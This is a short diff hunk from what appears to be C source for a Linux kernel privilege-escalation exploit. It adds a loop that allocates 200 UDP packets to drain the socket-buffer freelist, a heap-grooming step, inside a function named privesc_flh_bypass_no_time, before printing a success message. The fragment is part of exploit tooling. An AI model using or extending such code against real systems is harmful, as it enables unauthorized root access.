@@ -484,6 +484,14 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 					if (status_cnt == 0)
 						continue;
 
+						// pop N skbs from skb freelist
+					for (int i=0; i < 200; i++)
+					{
+						PRINTF_VERBOSE("[*] reserving udp packets... (%d/%d)\n", i, 200);
+						alloc_ipv4_udp(1);
+					}
+
+
 					printf("[+] successfully breached the mainframe as real-PID %u\n", pid_guess);
 
 					return;
